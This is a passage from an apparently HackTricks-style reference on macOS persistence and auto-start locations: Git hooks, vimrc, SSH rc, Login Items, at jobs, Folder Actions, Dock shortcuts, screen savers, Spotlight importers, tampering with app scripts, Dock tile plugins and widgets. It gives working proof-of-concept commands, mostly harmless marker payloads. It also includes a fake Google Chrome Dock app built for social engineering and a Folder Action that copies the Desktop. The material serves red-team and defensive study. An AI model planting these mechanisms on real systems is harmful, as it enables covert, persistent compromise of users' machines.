- **Write target:** An executable hook such as `<repo>/.git/hooks/post-checkout`. If `core.hooksPath` has already been set, use that configured directory instead. A hook committed as an ordinary tracked source file is not automatically installed into a clone.
- **Trigger:** The corresponding Git operation. For example, `post-checkout` runs after `git checkout` or `git switch`, and can also run after a clone or worktree creation. [Git's hook reference](https://git-scm.com/docs/githooks) lists the events and executable-bit requirement; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) changes the lookup directory.
- **Execution identity:** The account running Git. The hook can execute only if the repository's effective hooks directory is writable to the actor and the user later performs the relevant Git operation.

This marker-only PoC creates an entirely disposable repository, installs one hook, and switches a branch. It was executed successfully with Apple Git 2.50.1 on macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### Vim startup configuration

- **Write target:** `~/.vimrc` for the user who will launch Vim (or another startup file selected by Vim's initialization order). [Vim's startup reference](https://vimhelp.org/starting.txt.html) documents the file and the `VIMINIT`/`EXINIT` overrides.
- **Trigger:** A subsequent ordinary Vim start that loads this configuration. Vim's `-u NONE` bypasses the user vimrc. This is editor-specific execution, not an OS login trigger.
- **Execution identity:** The Vim user's account.

The following isolated PoC was run against macOS's `/usr/bin/vim`; it writes no real Vim preferences or open documents:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim has a separate user configuration path, `$XDG_CONFIG_HOME/nvim/init.lua` or `init.vim`, and also loads scripts in its `plugin/` runtime directories according to its [startup documentation](https://neovim.io/doc/user/starting/). Neovim was not installed on the macOS 26.5.2 test machine, so this variant was not run there.

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - But ssh needs to be enabled and used
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - SSH use to have FDA access

#### Location

- **`~/.ssh/rc`**
  - **Trigger**: Login via ssh
- **`/etc/ssh/sshrc`**
  - Root required
  - **Trigger**: Login via ssh

> [!CAUTION]
> To turn ssh on requires Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

By default, unless `PermitUserRC no` in `/etc/ssh/sshd_config`, when a user **logins via SSH** the scripts **`/etc/ssh/sshrc`** and **`~/.ssh/rc`** will be executed.<sup>[[14]](#references)</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - But you need to execute `osascript` with args
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **Registered login-item helper app:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (common bundled location).
  - **Trigger:** Registration may start the helper immediately; it then starts on later user logins, subject to approval.
- **Registered bundled agent/daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` or `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Trigger:** An approved agent may start on registration and at later logins; an approved daemon starts at boot. A daemon requires admin approval.

#### Description

In **System Settings → General → Login Items & Extensions**, users can review login and background items. macOS 13 and later provide [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) to register bundled login items, launch agents, and launch daemons. Its [`register()` behavior](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) differs by type and approval state. **Writing a helper into an app bundle is not sufficient to register a new login item.** Conversely, if an already registered helper executable is writable, changing that executable can affect its next launch without a new registration; verify the actual path and code-signing checks first.

The following is a read-only way to look for bundled helpers on a Mac; it neither registers nor launches any of them:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Older login items can also be managed through Apple events. It is possible to list, add, and remove them from the command line, although adding them changes the user's persistent login configuration and may require Automation approval:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` is an implementation detail, not a supported place to install a payload by simply writing a file. The older `SMLoginItemSetEnabled` API is superseded for new helpers by `SMAppService`; the page's former `/var/db/com.apple.xpc.launchd/loginitems.501.plist` path was absent on the macOS 26.5.2 test machine. Use the registration API and system UI state when assessing modern login items, not an assumed database path.

### ZIP as Login Item

(Check previous section about Login Items, this is an extension)

If you store a **ZIP** file as a **Login Item** the **`Archive Utility`** will open it and if the zip was for example stored in **`~/Library`** and contained the Folder **`LaunchAgents/file.plist`** with a backdoor, that folder will be created (it isn't by default) and the plist will be added so the next time the user logs in again, the **backdoor indicated in the plist will be executed**.

Another options would be to create the files **`.bash_profile`** and **`.zshenv`** inside the user HOME so if the folder LaunchAgents already exist this technique would still work.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - But you need to **execute** **`at`** and it must be **enabled**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Need to **execute** **`at`** and it must be **enabled**

#### **Description**

`at` tasks are designed for **scheduling one-time tasks** to be executed at certain times. Unlike cron jobs, `at` tasks are automatically removed post-execution. It's crucial to note that these tasks are persistent across system reboots, marking them as potential security concerns under certain conditions.<sup>[[16]](#references)</sup>

By **default** they are **disabled** but the **root** user can **enable** **them** with:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

This will create a file in 1 hour:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Check the job queue using `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Above we can see two jobs scheduled. We can print the details of the job using `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> If AT tasks aren't enabled the created tasks won't be executed.

The **job files** can be found at `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

The filename contains the queue, the job number, and the time it’s scheduled to run. For example let’s take a loot at `a0001a019bdcd2`.

- `a` - this is the queue
- `0001a` - job number in hex, `0x1a = 26`
- `019bdcd2` - time in hex. It represents the minutes passed since epoch. `0x019bdcd2` is `26991826` in decimal. If we multiply it by 60 we get `1619509560`, which is `GMT: 2021. April 27., Tuesday 7:46:00`.

If we print the job file, we find that it contains the same information we got using `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - But you need to be able to call `osascript` with arguments to contact **`System Events`** to be able to configure Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - It has some basic TCC permissions like Desktop, Documents and Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
  - Root required
  - **Trigger**: Access to the specified folder
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Trigger**: Access to the specified folder

#### Description & Exploitation

Folder Actions are scripts automatically triggered by changes in a folder such as adding, removing items, or other actions like opening or resizing the folder window. These actions can be utilized for various tasks, and can be triggered in different ways like using the Finder UI or terminal commands.<sup>[[17]](#references)[[18]](#references)</sup>

To set up Folder Actions, you have options like:

1. Crafting a Folder Action workflow with [Automator](https://support.apple.com/guide/automator/welcome/mac) and installing it as a service.
2. Attaching a script manually via the Folder Actions Setup in the context menu of a folder.
3. Utilizing OSAScript to send Apple Event messages to the `System Events.app` for programmatically setting up a Folder Action.
   - This method is particularly useful for embedding the action into the system, offering a level of persistence.

The following script is an example of what can be executed by a Folder Action:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

To make the above script usable by Folder Actions, compile it using:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

After the script is compiled, set up Folder Actions by executing the script below. This script will enable Folder Actions globally and specifically attach the previously compiled script to the Desktop folder.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Run the setup script with:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- This is the way yo implement this persistence via GUI:

This is the script that will be executed:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Compile it with: `osacompile -l JavaScript -o folder.scpt source.js`

Move it to:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Then, open the `Folder Actions Setup` app, select the **folder you would like to watch** and select in your case **`folder.scpt`** (in my case I called it output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Now, if you open that folder with **Finder**, your script will be executed.

This configuration was stored in the **plist** located in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in base64 format.

Now, lets try to prepare this persistence without GUI access:

1. **Copy `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** to `/tmp` to backup it:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Remove** the Folder Actions you just set:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Now that we have an empty environment

3. Copy the backup file: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Open the Folder Actions Setup.app to consume this config: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> And this didn't work for me, but those are the instructions from the writeup:(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - But you need to have installed a malicious application inside the system
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
  - **Trigger**: When the user clicks on the app inside the dock

#### Description & Exploitation

All the applications that appear in the Dock are specified inside the plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

It's possible to **add an application** just with:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Using some **social engineering** you could **impersonate for example Google Chrome** inside the dock and actually execute your own script:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - A very specific action needs to happen
  - You will end in another sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/Library/ColorPickers`
  - Root required
  - Trigger: Use the color picker
- `~/Library/ColorPickers`
  - Trigger: Use the color picker

#### Description & Exploit

**Compile a color picker** bundle with your code (you could use [**this one for example**](https://github.com/viktorstrate/color-picker-plus)) and add a constructor (like in the [Screen Saver section](macos-auto-start-locations.md#screen-saver)) and copy the bundle to `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Then, when the color picker is triggered, your bundle should execute as well.

Note that the binary loading your library has a **very restrictive sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Useful to bypass sandbox: **No, because you need to execute your own app**
- TCC bypass: ???

#### Location

- A specific app

#### Description & Exploit

An application example with a Finder Sync Extension [**can be found here**](https://github.com/D00MFist/InSync).

Applications can have `Finder Sync Extensions`. This extension will go inside an application that will be executed. Moreover, for the extension to be able to execute its code it **must be signed** with some valid Apple developer certificate, it must be **sandboxed** (although relaxed exceptions could be added) and it must be registered with something like:<sup>[[21]](#references)[[22]](#references)</sup>

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - But you will end in a common application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/System/Library/Screen Savers`
  - Root required
  - **Trigger**: Select the screen saver
- `/Library/Screen Savers`
  - Root required
  - **Trigger**: Select the screen saver
- `~/Library/Screen Savers`
  - **Trigger**: Select the screen saver

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Description & Exploit

Create a new project in Xcode and select the template to generate a new **Screen Saver**. Then, are your code to it, for example the following code to generate logs.<sup>[[23]](#references)[[24]](#references)</sup>

**Build** it, and copy the `.saver` bundle to **`~/Library/Screen Savers`**. Then, open the Screen Saver GUI and it you just click on it, it should generate a lot of logs:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Note that because inside the entitlements of the binary that loads this code (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) you can find **`com.apple.security.app-sandbox`** you will be **inside the common application sandbox**.

Saver code:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - But you will end in an application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - The sandbox looks very limited

#### Location

- `~/Library/Spotlight/`
  - **Trigger**: A new file with a extension managed by the spotlight plugin is created.
- `/Library/Spotlight/`
  - **Trigger**: A new file with a extension managed by the spotlight plugin is created.
  - Root required
- `/System/Library/Spotlight/`
  - **Trigger**: A new file with a extension managed by the spotlight plugin is created.
  - Root required
- `Some.app/Contents/Library/Spotlight/`
  - **Trigger**: A new file with a extension managed by the spotlight plugin is created.
  - New app required

#### Description & Exploitation

Spotlight is macOS's built-in search feature, designed to provide users with **quick and comprehensive access to data on their computers**.\
To facilitate this rapid search capability, Spotlight maintains a **proprietary database** and creates an index by **parsing most files**, enabling swift searches through both file names and their content.<sup>[[25]](#references)</sup>

The underlying mechanism of Spotlight involves a central process named 'mds', which stands for **'metadata server'.** This process orchestrates the entire Spotlight service. Complementing this, there are multiple 'mdworker' daemons that perform a variety of maintenance tasks, such as indexing different file types (`ps -ef | grep mdworker`). These tasks are made possible through Spotlight importer plugins, or **".mdimporter bundles**", which enable Spotlight to understand and index content across a diverse range of file formats.

The plugins or **`.mdimporter`** bundles are located in the places mentioned previously and if a new bundle appear it's loaded within monute (no need to restart any service). These bundles need to indicate which **file type and extensions they can manage**, this way, Spotlight will use them when a new file with the indicated extension is created.

It's possible to **find all the `mdimporters`** loaded running:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

And for example **/Library/Spotlight/iBooksAuthor.mdimporter** is used to parse these type of files (extensions `.iba` and `.book` among others):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> If you check the Plist of other `mdimporter` you might not find the entry **`UTTypeConformsTo`**. That's because that is a built-in _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) and it doesn't need to specify extensions.
>
> Moreover, System default plugins always take precedence, so an attacker can only access files that are not otherwise indexed by Apple's own `mdimporters`.

To create your own importer you could start with this project: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) and then change the name, the **`CFBundleDocumentTypes`** and add **`UTImportedTypeDeclarations`** so it supports the extension you would like to support and refelc them in **`schema.xml`**.\
Then **change** the code of the function **`GetMetadataForFile`** to execute your payload when a file with the processed extension is created.

Finally, **build and copy your new `.mdimporter`** to one of the three previous locations. You can check whether it is loaded by **monitoring the logs** or running **`mdimport -L`**.

### ~~Preference Pane~~

> [!CAUTION]
> It doesn't look like this is working anymore.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - It needs a specific user action
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

It doesn't look like this is working anymore.<sup>[[26]](#references)</sup>

### Application Script Files

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - But you need the targeted application to be installed and run/used by the victim
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

Any **interpreted script that ships inside (or is used by) an application and that the current user can modify**. Code-signature checks on a bundle normally cover the signed Mach-O, not plain-text helper scripts, so these can be tampered with and run on the next launch. Common examples:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – runs every time Sublime Text starts (user level)
- **`/opt/homebrew/bin/brew`** (Apple Silicon) or **`/usr/local/bin/brew`** (Intel) – `brew` is a user-writable Bash script executed every time the victim runs `brew` (user level)
- **IDLE** `idlemain.py` inside `Python 3.x.app` (root level)
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – run at load via launchd (root level)

#### Description & Exploitation

Many apps read interpreted scripts (Python, Ruby, shell…) at runtime rather than embedding that logic in the signed binary. If those files are writable by the attacker, injecting a line yields code execution in the app's context the next time the user launches/uses it — without dropping a new binary that KnockKnock/BlockBlock would flag.<sup>[[37]](#references)</sup>

```bash
# Homebrew launcher is a user-writable Bash script on Apple Silicon; inject AFTER the shebang
# (appending at the end would not run because brew execs its real logic earlier)
sed -i '' '1a\
touch /tmp/hacktricks_appscript
' /opt/homebrew/bin/brew          # runs on the next `brew ...` invocation

# Sublime Text startup script
echo "import os; os.system('touch /tmp/hacktricks_appscript')" >> "/Applications/Sublime Text.app/Contents/MacOS/sublime.py"
```

### Dock Tile Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - But a malicious app declaring the plugin must be placed in the Dock
  - The plugin loads into a **non-sandboxed, unsigned** helper with **library validation disabled**, and is **not shown in the Background Task Management** UI (stealthier than a LaunchAgent)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, referenced with the **`NSDockTilePlugIn`** key in the app's `Info.plist`; the plugin's own `Info.plist` sets **`NSPrincipalClass`**.

#### Description & Exploitation

When an app declares `NSDockTilePlugIn`, the Dock loads the referenced bundle into the **`com.apple.dock.external.extra`** XPC helper (`...extra.arm64` on Apple Silicon) **as soon as the app's tile is present in the Dock — the app itself does not need to be launched**. The helper runs **unsigned and non-sandboxed with library validation disabled**. The principal class' **`setDockTile:`** method is invoked on load; from there you can subscribe to distributed notifications (e.g. `com.apple.screenIsLocked`) to re-trigger code on later events.<sup>[[38]](#references)</sup>

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - The widget extension runs in its **own process**, and adding one does **not** raise a Background Task Management alert
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - The config plist lives inside a TCC-protected container, so editing it from outside needs Full Disk Access or a TCC bypass

#### Location

- Widget extension bundle: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Active/registered widgets: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (keys `widgets.instances` and `widgets.widgets`)

#### Description & Exploitation

A WidgetKit extension shipped inside an app runs in **its own process** managed by Notification Center. Registering an instance in `widgets.instances` (a base64 `NSKeyedArchiver`-encoded `CHSWidget` blob with embedded `INIntent` data) and restarting NotificationCenter makes the widget load and execute its `TimelineProvider`/intent code.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app Rules (Run AppleScript)

